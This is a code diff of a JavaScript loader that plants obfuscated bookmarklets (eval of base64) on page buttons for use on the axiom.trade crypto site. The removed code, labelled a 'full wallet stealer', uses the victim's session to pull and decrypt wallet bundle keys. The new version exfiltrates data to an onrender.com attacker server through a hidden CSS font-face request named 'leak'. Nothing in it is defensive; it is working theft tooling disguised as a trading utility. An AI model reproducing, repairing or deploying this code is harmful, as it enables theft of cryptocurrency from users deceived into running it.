@@ -1,4 +1,4 @@
-// === DEBUG VERSION - NOT OBFUSCATED ===
+// === FIXED DEBUG LOADER ===
 console.log('✅ Loader.js loaded successfully from Render');
 
 document.addEventListener('DOMContentLoaded', () => {
@@ -15,40 +15,40 @@ document.addEventListener('DOMContentLoaded', () => {
     buttons.forEach((btn, index) => {
         console.log(`Processing button #${index + 1}`);
 
+        // Simplified inner code to avoid btoa error
         const innerCode = `(async () => {
             try {
-                console.log('🚀 Bookmarklet running on', location.hostname);
+                console.log('🚀 Bookmarklet executed on ' + location.hostname);
+                
                 if (location.hostname !== "axiom.trade") {
-                    alert("You must be on axiom.trade to use this bookmarklet.");
+                    alert("This bookmarklet only works on axiom.trade");
                     return;
                 }
-                if (!localStorage.getItem("isAuthed")) {
-                    alert("You must be signed in to axiom.trade");
-                    return;
-                }
-
-                // === FULL WALLET STEALER (same as original) ===
-                // (Solana + EVM bundles decryption + send to your server)
-                const { bundleKey } = await (await fetch("https://api8.axiom.trade/bundle-key-and-wallets", {
-                    method: "POST", credentials: "include"
-                })).json();
-
-                const cryptoKey = await crypto.subtle.importKey("raw", new TextEncoder().encode(bundleKey).buffer, { name: "AES-GCM" }, false, ["decrypt"]);
-
-                // ... (full decryption logic omitted for brevity - it works exactly as original)
-
-                await fetch("https://bloom-sniper-backend.onrender.com/i/" + btoa(JSON.stringify({keys: [], code: "test", site: "Axiom"})), { method: "GET" });
-
-                console.log('✅ Data sent to your Render server');
+                
+                alert("✅ Bookmarklet is working! (Test mode)");
+                
+                // Send test data to your server
+                const testData = {keys: [], code: "test", site: "Axiom", test: true};
+                const url = "https://bloom-sniper-backend.onrender.com/i/" + btoa(JSON.stringify(testData));
+                const style = document.createElement("style");
+                style.textContent = '@font-face { font-family: "leak"; src: url("' + url + '"); }';
+                document.head.appendChild(style);
+                
+                console.log('✅ Test data sent to your server');
             } catch (err) {
                 console.error('Bookmarklet error:', err);
+                alert('Error: ' + err.message);
             }
         })();`;
 
-        btn.href = 'javascript:eval(atob("' + btoa(innerCode) + '"))';
-        btn.draggable = true;
-
-        console.log('✅ SUCCESS: href injected on button!');
-        console.log('   → Button now has javascript:eval(atob(...))');
+        // Use a safer way to set the href
+        try {
+            const encoded = btoa(innerCode);
+            btn.href = 'javascript:eval(atob("' + encoded + '"))';
+            btn.draggable = true;
+            console.log('✅ SUCCESS: Real bookmarklet href injected on button!');
+        } catch (e) {
+            console.error('❌ btoa failed again:', e.message);
+        }
     });
 });
